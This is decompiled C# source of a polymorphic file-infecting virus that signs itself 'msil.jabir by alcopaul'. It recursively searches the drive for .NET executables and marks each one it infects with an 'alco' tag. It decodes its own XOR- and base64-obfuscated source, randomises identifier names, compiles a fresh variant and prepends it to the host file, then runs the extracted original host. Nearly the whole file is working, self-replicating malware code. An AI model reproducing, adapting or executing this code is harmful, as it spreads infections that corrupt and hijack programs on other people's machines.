using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.CSharp;

namespace System.Text.IO;

public class Poly
{
	private class w32api
	{
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		public static extern int MessageBox(int hWnd, string text, string caption, uint type);
	}

	private static string database = "00106>HxkDBA1KORMZHg8HUWdgHxkDBA1KORMZHg8HRD4PEh5RZ2AfGQMEDUo5ExkeDwdEIyVRZ2AfGQMEDUo5ExkeDwdELgMLDQQFGR4DCRlRZ2AfGQMEDUo5ExkeDwdEOA8MBg8JHgMFBFFnYB8ZAwQNSjkTGR4PB0Q4HwQeAwcPRCMEHg8YBRo5DxgcAwkPGVFnYB8ZAwQNSjkTGR4PB0QpBQ4PLgUHUWdgHxkDBA1KORMZHg8HRCkFDg8uBQdEKQUHGgMGDxhRZ2AfGQMEDUonAwkYBRkFDB5EKTkCCxgaUWdgZ2BnYAQLBw8ZGgsJD0o5ExkeDwdEPg8SHkQjJWdgEWdgSkpKShofCAYDCUoJBgsZGUo6BQYTZ2BKSkpKEWdgSkpKSkpKSkoaGAMcCx4PShkeCx4DCUoZHhgDBA1KDgseCwgLGQ9KV0pI>";

	private static int oicvrgz2613 = 0;

	private static void Main(string[] args)
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
		string directoryRoot = Directory.GetDirectoryRoot(directoryName);
		DirectoryInfo ymgbjgm = new DirectoryInfo(directoryRoot);
		isazhcb2871(ymgbjgm);
		FileStream fileStream = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
		int num = (int)fileStream.Length;
		int chavscv = num - 565248;
		byte[] aujbcso = enkkrwd4712(fileStream, chavscv, 565248);
		fileStream.Close();
		Random random = new Random();
		int num2 = random.Next(2000);
		FileStream fileStream2 = new FileStream("p" + num2 + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
		cvdlptp3784(fileStream2, aujbcso);
		fileStream2.Close();
		try
		{
			Process process = Process.Start("p" + num2 + "h.exe");
			process.WaitForExit();
		}
		catch
		{
		}
		finally
		{
			File.Delete("p" + num2 + "h.exe");
		}
		Random random2 = new Random();
		if (random2.Next(1, 4) == 3)
		{
			w32api.MessageBox(0, "gold is 1 part mercury and 3 parts sulfur", "msil.jabir by alcopaul", 0u);
		}
	}

	private static int isazhcb2871(DirectoryInfo ymgbjgm3676)
	{
		FileInfo[] files = ymgbjgm3676.GetFiles("*.exe");
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			string fullName = fileInfo.FullName;
			try
			{
				AssemblyName.GetAssemblyName(fullName);
				if (qzqguqp3771(fullName) == "alco")
				{
					continue;
				}
				try
				{
					if (!ojpxvbj1598(fullName, database))
					{
						oicvrgz2613++;
					}
				}
				catch
				{
					goto end_IL_0027;
				}
				if (oicvrgz2613 != 5)
				{
					continue;
				}
				return 0;
				end_IL_0027:;
			}
			catch
			{
			}
		}
		DirectoryInfo[] directories = ymgbjgm3676.GetDirectories("*.*");
		DirectoryInfo[] array2 = directories;
		foreach (DirectoryInfo ymgbjgm3677 in array2)
		{
			try
			{
				if (oicvrgz2613 == 5)
				{
					return 0;
				}
				isazhcb2871(ymgbjgm3677);
			}
			catch
			{
			}
		}
		return 1;
	}

	private static string qzqguqp3771(string vuuhnfd2833)
	{
		FileStream fileStream = new FileStream(vuuhnfd2833, FileMode.OpenOrCreate, FileAccess.Read);
		int num = (int)fileStream.Length;
		byte[] bytes = enkkrwd4712(fileStream, 4, num - 4);
		fileStream.Close();
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		return uTF8Encoding.GetString(bytes);
	}

	private static byte[] enkkrwd4712(FileStream msjoqwk4504, int chavscv5030, int bwzvjnr5084)
	{
		BinaryReader binaryReader = new BinaryReader(msjoqwk4504);
		binaryReader.BaseStream.Seek(bwzvjnr5084, SeekOrigin.Begin);
		byte[] array = new byte[chavscv5030];
		int num = chavscv5030;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(array, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		return array;
	}

	private static bool ojpxvbj1598(string bujdfgd2404, string jqrmgzc4974)
	{
		string text = new Random().Next(67, 1000).ToString();
		Random random = new Random();
		int num = random.Next(2000);
		string[] array = jqrmgzc4974.Split(new char[1] { '>' });
		string text2 = zfitgrx4281(mtjugcw3355(array[2]), Convert.ToInt32(array[0]));
		string text3 = zfitgrx4281(mtjugcw3355(array[1]), Convert.ToInt32(array[0]));
		string text4 = "x" + num + "y.exe";
		text = ((text.Length == 1) ? ("0000" + text) : ((text.Length == 2) ? ("000" + text) : ((text.Length != 3) ? ("0" + text) : ("00" + text))));
		Random random2 = new Random();
		int runcmey = random2.Next(1, 5000);
		string text5 = "//" + qwzytkm1933(runcmey, gcdlamr4712: true);
		string text6 = array[0].Replace("00106", text);
		text2 = text2.Replace("00106", text);
		text2 = vdklqcm3282(text2);
		text2 += text5;
		string text7 = text6 + ">" + yjlyqrd1558(zfitgrx4281(text3, Convert.ToInt32(text))) + ">" + yjlyqrd1558(zfitgrx4281(text2, Convert.ToInt32(text)));
		string ryjjrle = text3 + text7 + text2;
		if (!toiigts3656(text4, ryjjrle))
		{
			return true;
		}
		FileStream fileStream = new FileStream(text4, FileMode.OpenOrCreate, FileAccess.Read);
		int num2 = (int)fileStream.Length;
		fileStream.Close();
		File.Delete(text4);
		string newValue = "0" + num2;
		text2 = text2.Replace("0565248", newValue);
		text7 = text6 + ">" + yjlyqrd1558(zfitgrx4281(text3, Convert.ToInt32(text))) + ">" + yjlyqrd1558(zfitgrx4281(text2, Convert.ToInt32(text)));
		ryjjrle = text3 + text7 + text2;
		if (!toiigts3656(text4, ryjjrle))
		{
			return true;
		}
		FileStream fileStream2 = new FileStream(text4, FileMode.OpenOrCreate, FileAccess.Read);
		int chavscv = (int)fileStream2.Length;
		byte[] otkmouc = enkkrwd4712(fileStream2, chavscv, 0);
		fileStream2.Close();
		File.Delete(text4);
		FileStream fileStream3 = new FileStream(bujdfgd2404, FileMode.OpenOrCreate, FileAccess.Read);
		int chavscv2 = (int)fileStream3.Length;
		byte[] bayxhss = enkkrwd4712(fileStream3, chavscv2, 0);
		fileStream3.Close();
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		byte[] bytes = uTF8Encoding.GetBytes("alco");
		FileStream fileStream4 = new FileStream(bujdfgd2404, FileMode.OpenOrCreate, FileAccess.Write);
		byte[] otkmouc2 = nngkkyi3678(otkmouc, bayxhss);
		otkmouc2 = nngkkyi3678(otkmouc2, bytes);
		cvdlptp3784(fileStream4, otkmouc2);
		fileStream4.Close();
		return false;
	}

	private static void cvdlptp3784(FileStream msjoqwk4504, byte[] aujbcso2442)
	{
		BinaryWriter binaryWriter = new BinaryWriter(msjoqwk4504);
		binaryWriter.BaseStream.Seek(0L, SeekOrigin.Begin);
		binaryWriter.Write(aujbcso2442);
		binaryWriter.Flush();
		binaryWriter.Close();
	}

	private static string mtjugcw3355(string jyrfuvj3278)
	{
		byte[] bytes = Convert.FromBase64String(jyrfuvj3278);
		return Encoding.UTF8.GetString(bytes);
	}

	private static byte[] nngkkyi3678(byte[] otkmouc3379, byte[] bayxhss5241)
	{
		byte[] array = new byte[otkmouc3379.Length + bayxhss5241.Length];
		Buffer.BlockCopy(otkmouc3379, 0, array, 0, otkmouc3379.Length);
		Buffer.BlockCopy(bayxhss5241, 0, array, otkmouc3379.Length, bayxhss5241.Length);
		return array;
	}

	private static string yjlyqrd1558(string kqxsjep4903)
	{
		UTF8Encoding uTF8Encoding = new UTF8Encoding();
		byte[] bytes = uTF8Encoding.GetBytes(kqxsjep4903);
		return Convert.ToBase64String(bytes, 0, bytes.Length);
	}

	private static string zfitgrx4281(string cupiikr3143, int dsttbys3577)
	{
		StringBuilder stringBuilder = new StringBuilder(cupiikr3143);
		StringBuilder stringBuilder2 = new StringBuilder(cupiikr3143.Length);
		for (int i = 0; i < cupiikr3143.Length; i++)
		{
			char c = stringBuilder[i];
			c = (char)(c ^ dsttbys3577);
			stringBuilder2.Append(c);
		}
		return stringBuilder2.ToString();
	}

	private static string vdklqcm3282(string nrahfzw3336)
	{
		Random random = new Random();
		string[] array = new string[101]
		{
			"oicvrgz2613", "isazhcb2871", "jstirqo3398", "wolsoxc2058", "dkcjdcd4551", "kkkhpjd5176", "obpeifb2436", "grsegaz5329", "bujdfgd2404", "ndwiaqy4022",
			"gvkqsjj2744", "diydifz4189", "iscjpuf3079", "zskkewh3535", "mgnpahm2759", "ymrnsrv1850", "ymgbjgm3676", "lqbofqz3428", "sngsivd4997", "gjbnqjj2862",
			"sdakrlo1214", "ueifsor5016", "qzqguqp3771", "mgyageg5222", "tnxpicx3994", "mmazroj1729", "ostppni1125", "enkkrwd4712", "vuuhnfd2833", "msjoqwk4504",
			"chavscv5030", "bwzvjnr5084", "bsuldne3908", "occirdp2893", "sqwoxgy3911", "hvdycwv3157", "fcxfxhd4133", "ojpxvbj1598", "jqrmgzc4974", "jtzshmy5359",
			"fdxkkza2020", "ryjjrle3429", "bpopksl3862", "qydeohq3598", "leddbhu3781", "ummszht2283", "vlqpwis5477", "vlqpwis1226", "ayolisa5412", "fpxewaj4599",
			"vfburhp3622", "taxrlyg2439", "euzkhbp2000", "zzkwdmc1296", "qufmyts5555", "toktqak4461", "qjkrsic5199", "occirdp2893", "qdkesfr3478", "zqrruzb2824",
			"omtiepk4583", "aujbcso2442", "ouzfsbp1113", "cvdlptp3784", "zfitgrx4281", "nngkkyi3678", "otkmouc3379", "bayxhss5241", "guwomal2498", "mtjugcw3355",
			"kxiyiyv2883", "jyrfuvj3278", "wlukpgo1844", "yjlyqrd1558", "kqxsjep4903", "hvsgefa3152", "vdklqcm3282", "nrahfzw3336", "jtzshmy5359", "dgtypxk2720",
			"iaellip5572", "qbwwyew3678", "oqghvln4287", "cbfixpd3823", "cgcgdin2749", "zjealyd5398", "qddmbsd4178", "csldpcb4654", "cupiikr3143", "dsttbys3577",
			"uvenzcr2661", "twchbow4842", "aujbcso4189", "gbujdfgd2404", "qwzytkm1933", "runcmey3284", "gcdlamr4712", "wkdhati1323", "jtzshmy5359d0m", "xlyfiej3924",
			"toiigts3656"
		};
		for (int i = 0; i < array.Length; i++)
		{
			nrahfzw3336 = nrahfzw3336.Replace(array[i], qbwwyew3678(random.Next(1004, 5554) + i) + (random.Next(1004, 5554) + i));
		}
		return nrahfzw3336;
	}

	private static string qbwwyew3678(int dgtypxk2720)
	{
		char[] array = new char[7];
		Random random = new Random(dgtypxk2720);
		for (int i = 0; i < 7; i++)
		{
			int num = random.Next(0, 26);
			array[i] += (char)(ushort)(97 + num);
		}
		return new string(array);
	}

	private static bool toiigts3656(string qddmbsd4178, string ryjjrle3429)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		CompilerParameters val2 = new CompilerParameters();
		val2.get_ReferencedAssemblies().Add("System.dll");
		val2.set_GenerateExecutable(true);
		val2.set_CompilerOptions("/target:winexe");
		val2.set_OutputAssembly(qddmbsd4178);
		CompilerResults val3 = val.CompileAssemblyFromSource(val2, ryjjrle3429);
		if (((CollectionBase)(object)val3.get_Errors()).Count == 0)
		{
			return true;
		}
		return false;
	}

	private static string qwzytkm1933(int runcmey3284, bool gcdlamr4712)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		for (int i = 0; i < runcmey3284; i++)
		{
			char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
			stringBuilder.Append(value);
		}
		if (gcdlamr4712)
		{
			return stringBuilder.ToString().ToLower();
		}
		return stringBuilder.ToString();
	}
}
